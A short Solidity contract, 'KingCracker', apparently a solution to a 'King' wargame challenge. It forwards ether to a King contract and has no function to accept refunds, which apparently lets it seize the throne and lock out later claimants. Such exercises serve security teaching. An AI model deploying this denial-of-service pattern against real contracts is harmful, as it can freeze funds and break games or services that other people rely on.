// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Task.sol";

contract KingCracker {

  King king;

  constructor(address payable _king) {
    king = King(_king);
  }
  

  function sendToKing() public payable {
    (bool sent, ) = address(king).call{value: msg.value}("");
    require(sent, "Failed to send eth");
  }
} 